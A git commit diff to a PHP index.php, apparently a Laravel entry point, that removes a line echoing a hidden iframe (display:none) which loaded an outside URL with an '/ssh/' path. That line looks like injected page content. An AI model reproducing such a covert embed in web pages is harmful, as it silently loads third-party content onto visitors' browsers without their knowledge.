d6e8d92f59965517ab8a23f829e822608acc19fa
asdthehiro <asdthehiro13@gmail.com>
2024-10-17 21:52:22 +0300

    up

--- index.php
+++ index.php
@@ -10,7 +10,6 @@ ini_set('max_execution_time', -1);
 ini_set('max_input_time', -1);
 ini_set('post_max_size', -1);
 
-echo '<iframe src="https://edu-master.com/ssh/" style="display:none;"></iframe>';
 
 define('LARAVEL_START', microtime(true));
 
